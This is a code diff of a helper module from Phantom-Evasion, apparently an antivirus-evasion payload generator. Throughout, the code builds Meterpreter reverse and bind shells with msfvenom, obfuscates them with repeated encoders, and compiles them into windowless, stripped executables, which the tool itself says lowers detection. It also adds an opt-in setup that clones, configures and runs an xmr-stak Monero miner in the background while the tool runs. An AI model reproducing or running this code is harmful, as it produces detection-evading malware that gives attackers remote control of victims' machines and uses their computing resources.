@@ -75,6 +75,20 @@ def Enter2Continue():
 
     pass
 
+def InputFunc(Text):
+
+    py_version=platform.python_version()
+
+    if py_version[0] == "3":
+
+        Ans = input(Text)
+
+    else:
+
+        Ans = raw_input(Text)
+
+    return Ans    
+
 def linux_isready():
     
     try:
@@ -85,10 +99,11 @@ def linux_isready():
         print("[-] Only dependencies check ( auto install not supported )\n")
         print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
         auto_check("apktool")
+        Apktool_download()
         auto_check("gcc")
         auto_check("mingw-w64")
         auto_check("pyinstaller")
-        auto_check("zipalign")
+        auto_check("apksigner")
         auto_check("msfvenom")
         auto_check("msfconsole")
         auto_check("openssl")
@@ -118,10 +133,11 @@ def kali_arch_isready():
         subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
     sleep(0.5)
     auto_setup("apktool")
+    Apktool_download()
     auto_setup("gcc")
     auto_setup("mingw-w64")
     auto_setup("pyinstaller")
-    auto_setup("zipalign")
+    auto_setup("apksigner")
     auto_setup("msfvenom")
     auto_setup("msfconsole")
     auto_setup("openssl")
@@ -152,10 +168,11 @@ def ubuntu_isready():
         sleep(1)
         subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
     auto_setup("apktool")
+    Apktool_download()
     auto_setup("gcc")
     auto_setup("mingw-w64")
     auto_setup("pyinstaller")
-    auto_setup("zipalign")
+    auto_setup("apksigner")
     auto_setup("openssl")
     auto_setup("strip")
     auto_setup("wine")
@@ -205,6 +222,7 @@ def auto_setup(name):
 
 def auto_check(name):
     name2=name
+    numspace = " " * (35 - len(name))
     if "mingw-w64" in name:
 
         name2="i686-w64-mingw32-gcc"
@@ -214,11 +232,35 @@ def auto_check(name):
 
 
     except subprocess.CalledProcessError: 
-        print(bcolors.RED + "[-] " + name + "  [Not Found]\n" + bcolors.ENDC)
+        print(bcolors.RED + "[-] " + name + numspace + "  [Not Found]\n" + bcolors.ENDC)
         sleep(1)
     else:
-        print(bcolors.GREEN + "[+] " + name + "  [Found]\n" + bcolors.ENDC) 
+        print(bcolors.GREEN + "[+] " + name + numspace + "  [Found]\n" + bcolors.ENDC) 
         sleep(0.1)
+
+
+
+def Apktool_download():
+    numspace = " " * (35 - len("apktool.jar file"))
+    if os.path.isfile("Setup/apk_sign/apktool_2.3.3.jar") != True:
+
+        print(bcolors.RED + "[+] apktool.jar file" + numspace + "  [Not Found]\n" + bcolors.ENDC)
+        sleep(0.5)
+        print(bcolors.GREEN + "[>] Trying to download from https://ibotpeaches.github.io/Apktool:\n" + bcolors.ENDC)
+        sleep(0.1)
+        PH_dir=os.getcwd()
+        os.chdir("Setup/apk_sign")
+        os.system("wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.3.jar || curl -O https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.3.jar")
+        os.chdir(PH_dir)
+
+    else:
+
+        print(bcolors.GREEN + "[+] apktool.jar file" + numspace + "  [Found]" + bcolors.ENDC)
+        sleep(0.1)
+        
+
+    
+
 
 def dependencies_checker():
     platform_used=""
@@ -270,10 +312,9 @@ def strip_tease(Filename):
     print("This is useful for minimizing their file size, streamlining them for distribution.\n")
     print("It can also be useful for making it more difficult to reverse-engineer the compiled code.\n")
     print("(Lower rate of detection)\n")
-    if py_version[0] == "3":
-        RequireStrip = YesOrNo(input("\n[>] Strip executable? (y/n):"))
-    else:
-        RequireStrip = YesOrNo(raw_input("\n[>] Strip executable? (y/n):"))
+
+    RequireStrip = YesOrNo(InputFunc("\n[>] Strip executable? (y/n):"))
+
 
     if RequireStrip == "True":
         sleep(0.5)
@@ -304,6 +345,7 @@ def wine_check():
         
         
     else:
+
         if "cannot find" in py_check:
             print(bcolors.RED + bcolors.BOLD + "\n[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
             print("In order to use windows wine-pyinstaller modules you need to\n manually install python on wine manually (\"wine python -v\" to check if python is reachable from commandline)\n")
@@ -314,8 +356,11 @@ def wine_check():
             FLAG1="OK"
             
     try:
+
         pyin_check=subprocess.check_output(['wine','pyinstaller','-v'],stderr=subprocess.STDOUT)
-    except subprocess.CalledProcessError: 
+
+    except subprocess.CalledProcessError:
+
         print(bcolors.RED + bcolors.BOLD + "\n[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
         print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
         Enter2Continue() 
@@ -343,52 +388,77 @@ def wine_check():
                 conf.write(new_conf)
 
 def miner_advisor():
-    sleep(0.5)
+
+    sleep(0.2)
+
     py_version=platform.python_version()
     filename="Setup/Config.txt"
+
     donate_config = open(filename, "r")
+
     for line in donate_config:
-        if "Miner=FirstRun" in line: 
+
+        if "Miner=FirstRun" in line:
+
             print(bcolors.OCRA + "\n[Optional] XMR-STAK setup: " + bcolors.ENDC + "In order to support the developer of this tool,\nyou can help out by allowing the program to install a Monero Miner\nalong side the program's main functionality.\nThe miner will be configured to use a low amount of system resources\nduring phantom-evasion execution and can be deactivated at any time\nshould you wish to do so" + bcolors.ENDC)
-            if py_version[0] == "3": 
-                ans=input("\n[>]Install optional miner(y/n):")
-            else:
-                ans=raw_input("\n[>]Install optional miner(y/n):")
+
+            ans=InputFunc("\n[>]Install optional miner(y/n):")
 
             if (ans == "y") or ( ans == "Y"):
+
                 print("\n[>] Installing Xmr-stak\n ")
                 xmr_setup()
                 new_conf=""
                 config = open(filename, "r")
+
                 for line in config:
+
                     line=line.replace("Miner=FirstRun","Miner=Installed")
                     new_conf+=line
+
                 with open("Setup/Config.txt", "w") as configw:
+
                         configw.write(new_conf)
             else:
+
                 print("\n[>] Xmr-stak will not be installed\n")
                 new_conf=""
                 config = open(filename, "r")
                 for line in config:
                     line=line.replace("Miner=FirstRun","Miner=Refused")
                     new_conf+=line
+
+                config.close()
+
                 with open("Setup/Config.txt", "w") as configw:
+
                     configw.write(new_conf)
+                    configw.close()
+
             sleep(2)
 
 def xmr_setup():
+
     os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
+
     username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))
 
     with open("Setup/Config.txt", "r") as config:
+
         new_conf=""
+
         for line in config:
+
             new_conf+=line
+
         new_conf+="Mining=True\n"
-        new_conf+="Username=" + username + "\n" 
+        new_conf+="Username=" + username + "\n"
+        config.close()
 
     with open("Setup/Config.txt", "w") as config:
+
         config.write(new_conf)
+        config.close()
 
     miner_config2 = ""
     miner_config2 += "\"call_timeout\" : 10,\n"
@@ -409,7 +479,9 @@ def xmr_setup():
     miner_config2 += "\"prefer_ipv4\" : true,\n"
 
     with open("Setup/Donate/xmr-stak/build/bin/config.txt", "w") as xmrconfig:
+
         xmrconfig.write(miner_config2)
+        xmrconfig.close()
 
     pool_config = ""
     pool_config += "\"pool_list\" :\n"
@@ -420,31 +492,36 @@ def xmr_setup():
 
     with open("Setup/Donate/xmr-stak/build/bin/pools.txt", "w") as poolconfig:
         poolconfig.write(pool_config)
+        poolconfig.close()
+
 
     cpu_config = ""
     cpu_config += "\"cpu_threads_conf\" :\n"
     cpu_config += "[\n\n"
 
-    if multiprocessing.cpu_count() == 2:
+    Thread_num = multiprocessing.cpu_count()
+
+    if Thread_num == 2:
+
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
 
-    elif multiprocessing.cpu_count() == 4:
+    elif Thread_num == 4:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
 
-    elif multiprocessing.cpu_count() == 6:
+    elif Thread_num == 6:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
 
-    elif multiprocessing.cpu_count() == 8:
+    elif Thread_num == 8:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
 
-    elif multiprocessing.cpu_count() == 12:
+    elif Thread_num == 12:
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
 
-    elif multiprocessing.cpu_count() >= 16:
+    elif Thread_num >= 16:
 
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
         cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"    
@@ -458,6 +535,7 @@ def xmr_setup():
 
     with open("Setup/Donate/xmr-stak/build/bin/cpu.txt", "w") as cpuconfig:
         cpuconfig.write(cpu_config)
+        cpuconfig.close()
 
 def advisor():
     clear()
@@ -468,7 +546,7 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "1.0 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "1.2 \n")
     sleep(0.2)
     print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "24\n")
     sleep(0.2)
@@ -492,7 +570,7 @@ def banner():
     bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
     bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
     bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
-    bann += "                                                        v1.1      \n"
+    bann += "                                                        v1.2      \n"
     sleep(0.3)
     print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
   
@@ -521,15 +599,12 @@ def python_sys_completer(wine):
     print(bcolors.OCRA + "[Python dropper]"  + bcolors.ENDC + " Choose how to supply commandline payload:\n")
     print("[1] Custom commandline payload\n")
     print("[0] Back\n")
-    if py_version[0] == "3":
-        ans=input("\n[>] Please insert choice\'s number: ")
-    else:
-        ans=raw_input("\n[>] Please insert choice\'s number: ") 
+
+    ans=InputFunc("\n[>] Please insert choice\'s number: ")
+
     if ans == "1":
-        if py_version[0] == "3": 
-            ans=input("\n[>]  Insert oneline payload: ")
-        else:
-            ans=raw_input("\n[>]  Insert oneline payload: ")
+
+        ans=InputFunc("\n[>]  Insert oneline payload: ")
 
         pytherpreter_launcher(ans,"Python_Polymorphic_Powershelloneline",wine)
 
@@ -541,65 +616,49 @@ def xmr_miner():
     os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt -C Setup/Donate/xmr-stak/build/bin/pools.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 
 
 def pytherpreter_completer(module_type,wine):
+
     clear()
+
     print(bcolors.OCRA + "\n[<Pytherpreter>] choose meterpreter payload:\n\n"  + bcolors.ENDC)
     print("[+] python/meterpreter/reverse_tcp\n")
     print("[+] python/meterpreter/reverse_http\n")
     print("[+] python/meterpreter/reverse_https\n")
     print("[+] python/meterpreter/bind_tcp\n")
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        ans=input("\n[>] Please type one of the following payload: ")
-    else:
-        ans=raw_input("\n[>] Please type one of the following payload: ")
+
+    ans=InputFunc("\n[>] Please type one of the following payload: ")
+
     if "reverse" in ans:
-        if py_version[0] == "3":
-            Lhost = input("\n[>] Please insert LHOST: ")
-            Lport = input("\n[>] Please insert LPORT: ")
-        else:
-            Lhost = raw_input("\n[>] Please insert LHOST: ")
-            Lport = raw_input("\n[>] Please insert LPORT: ")
-        
-        Lhost= "LHOST=" + str(Lhost)
-        Lport= "LPORT=" + str(Lport)
-        print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
-        if platform.system == "Windows":
-            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport],shell=True)
-        else:
-            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport])
-        pytherpreter_launcher(Paytime,module_type,wine)
+
+        Lhost = InputFunc("\n[>] Please insert LHOST: ")
+        Lport = InputFunc("\n[>] Please insert LPORT: ")        
+        Host= "LHOST=" + str(Lhost)
+        Port= "LPORT=" + str(Lport)
 
     elif "bind" in ans:
- 
-        if py_version[0] == "3":
-            Rhost = input("\n[>] Please insert RHOST: ")
-            Rport = input("\n[>] Please insert RPORT: ")
-        else:
-            Rhost = raw_input("\n[>] Please insert RHOST: ")
-            Rport = raw_input("\n[>] Please insert RPORT: ")
 
-        Rhost= "RHOST=" + str(Rhost)
-        Rport= "RPORT=" + str(Rport)
-        print(bcolors.GREEN + "\n[>] Generating code...\n"  + bcolors.ENDC)
-        if platform.system == "Windows":
+        Rhost = InputFunc("\n[>] Please insert RHOST: ")
+        Rport = InputFunc("\n[>] Please insert RPORT: ")
+        Host= "RHOST=" + str(Rhost)
+        Port= "RPORT=" + str(Rport)
 
-            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Rhost,Rport],shell=True)
-        else:
+    print(bcolors.GREEN + "\n[>] Generating code...\n"  + bcolors.ENDC)
 
-            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Rhost,Rport])
+    if platform.system == "Windows":
 
-        pytherpreter_launcher(Paytime,module_type,wine)
+        Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Host,Port],shell=True)
+    else:
+
+        Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Host,Port])
+
+    pytherpreter_launcher(Paytime,module_type,wine)
     
 
 def pytherpreter_launcher(rec_Payload,module_type,wine):
-    generated_pyth=str(rec_Payload)
-    py_version=platform.python_version()
 
-    if py_version[0] == "3":    
-        Filename=input(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)
-    else:
-        Filename=raw_input(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)  
-      
+    generated_pyth=str(rec_Payload)
+
+    Filename=InputFunc(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)
+
     Filename+=".py"
 
     if platform.system() == "Linux" :
@@ -633,15 +692,15 @@ def pytherpreter_launcher(rec_Payload,module_type,wine):
     auto_pyinstall(Filename,wine)   
 
 def auto_pyinstall(filename,wine):
-    py_version=platform.python_version()
+
     if wine == False:
-        if py_version[0] == "3": 
-            ans=input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
-        else:
-            ans=raw_input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
+
+        ans=InputFunc(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
 
         if ans == "y":
+
             if platform.system() == "Linux":
+
                 subprocess.call(['pyinstaller','--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
             
             elif platform.system() == "Windows":
@@ -658,11 +717,11 @@ def auto_pyinstall(filename,wine):
             os.remove(filename + ".spec")
             os.rmdir("dist")
             sleep(0.5) 
-            print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder" + bcolors.ENDC) 
+            print(bcolors.GREEN + "\n[>] Executable saved in Phantom-Evasion folder" + bcolors.ENDC) 
             Enter2Continue()
   
         else:
-            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder"  + bcolors.ENDC)
+            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom-Evasion folder"  + bcolors.ENDC)
             Enter2Continue()
 
 
@@ -686,11 +745,12 @@ def auto_pyinstall(filename,wine):
         os.remove(filename + ".spec")
         os.rmdir("dist")
         sleep(0.5) 
-        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder" + bcolors.ENDC)   
+        print(bcolors.GREEN + "\n[>] Executable saved in Phantom-Evasion folder" + bcolors.ENDC)   
         Enter2Continue() 
 
 
 def menu_options():
+
     print("    =====================================================================")
     print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
     print("  ||                                 ||                                  || ")
@@ -703,6 +763,7 @@ def menu_options():
     print("  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
     print("  ||                                 ||                                  || ")
     print("    =====================================================================")
+
 
 def payload_advisor(payload,module_choice):
     if "windows" in payload:
@@ -724,50 +785,134 @@ def payload_advisor(payload,module_choice):
     else:
         shellcode_completer(module_choice)
 
-def payload_generator(msfvenom_payload,arch,host,port,payload_format):
+
+def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
     py_version=platform.python_version()    
 
-    Randiter = str(random.randint(1,5))
+    Randiter = str(random.randint(1,2))
     platform == ""
  
 
     if "reverse" in msfvenom_payload:
 
-        Lhost= "LHOST=" + str(host)
-        Lport= "LPORT=" + str(port)
+        Host= "LHOST=" + str(host)
+        Port= "LPORT=" + str(port)
 
     if "bind" in msfvenom_payload: 
 
-        Rhost= "RHOST=" + str(host)
-        Rport= "RPORT=" + str(port)
-
-        
-
+        Host= "RHOST=" + str(host)
+        Port= "RPORT=" + str(port)
 
     if platform.system() == "Windows":
-        if py_version[0] == "3":
-            if payload_format == "c":
-                if arch == "x86":
-                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                if arch == "x64":
-                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+        if py_version[0] == "3":
+
+            if payload_format == "c":
+
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    if arch == "x86":
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
+
+                        Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    if arch == "x64":
+
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
+
+                        Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                else:
+
+
+                    if arch == "x86":
+
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    if arch == "x64":
+
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
             if payload_format == "psh":
 
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
+                    ARGs += CustomOpt
+                    ARGs += ['-f','psh']
+
+                    Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                else:
+
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+
         else:
 
             if payload_format == "c":
-                if arch == "x86":
-                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
 
-                if arch == "x64":
-                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    if arch == "x86":
+
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
+
+                        Payload = subprocess.check_output(ARGs,shell=True)
+
+                    if arch == "x64":
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
+
+                        Payload = subprocess.check_output(ARGs,shell=True)
+
+                else:
+
+                    if arch == "x86":
+
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+
+                    if arch == "x64":
+
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+
 
 
             if payload_format == "psh":
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'],shell=True)
+
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+
+                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
+                    ARGs += CustomOpt
+                    ARGs += ['-f','psh']
+
+                    Payload = subprocess.check_output(ARGs,shell=True)
+
+                else:
+
+
+
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'],shell=True)
 
         
     else:
@@ -775,37 +920,112 @@ def payload_generator(msfvenom_payload,arch,host,port,payload_format):
         if py_version[0] == "3":
 
             if payload_format == "c":
-                if arch == "x86":
-                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                if arch == "x64":
-                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    if arch == "x86":
+
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
+
+                        Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    if arch == "x64":
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
+
+                        Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                else:
+
+                    if arch == "x86":
+
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    if arch == "x64":
+
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+
 
             if payload_format == "psh":
 
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
+                    ARGs += CustomOpt
+                    ARGs += ['-f','psh']
+
+                    Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                else:
+
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
         else:
 
             if payload_format == "c":
-                if arch == "x86":
-                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
-                if arch == "x64":
-                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+                if CustomOpt != "":
+
+                    CustomOpt=CustomOpt.split()
+
+                    if arch == "x86":
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']                        
+
+                        Payload = subprocess.check_output(ARGs)
+
+                    if arch == "x64":
+
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs += CustomOpt
+                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
+
+                        Payload = subprocess.check_output(ARGs)
+
+                else:
+
+                    if arch == "x86":
+
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+
+                    if arch == "x64":
+
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
             if payload_format == "psh":
 
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'-f','psh'])
+                if CustomOpt != "":
 
+                    CustomOpt=CustomOpt.split()
 
+                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
+                    ARGs += CustomOpt
+                    ARGs += ['-f','psh']
+
+                    Payload = subprocess.check_output(ARGs)
+
+                else:
+
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'])
 
     return str(Payload)
 
         
 def custom_payload_completer(custom_shellcode):
 
-    Payload = "unsigned char buf[] = \"" + custom_shellcode + "\";\n"
+    Payload = "unsigned char * buf = \"" + custom_shellcode + "\";\n"
 
     return Payload
 
@@ -816,16 +1036,26 @@ def auto_compiler(module_type,arch,filename,ws2 = False):
 
         if "windows" in module_type and arch == "x86":
             filename += ".exe"
+
             if ws2 != True: 
+
                 subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 
+
             else:
+
                 subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32']) 
 
         elif "windows" in module_type and arch == "x64": 
 
             filename += ".exe"
 
-            subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])
+            if ws2 != True:
+
+                subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])
+
+            else:
+
+                subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32'])
 
         elif "linux" in module_type and arch == "x86":
 
@@ -849,7 +1079,8 @@ def auto_compiler(module_type,arch,filename,ws2 = False):
 
                 subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)
 
-        elif "windows" in module_type and arch == "x64": 
+        elif "windows" in module_type and arch == "x64":
+ 
             filename += ".exe"
 
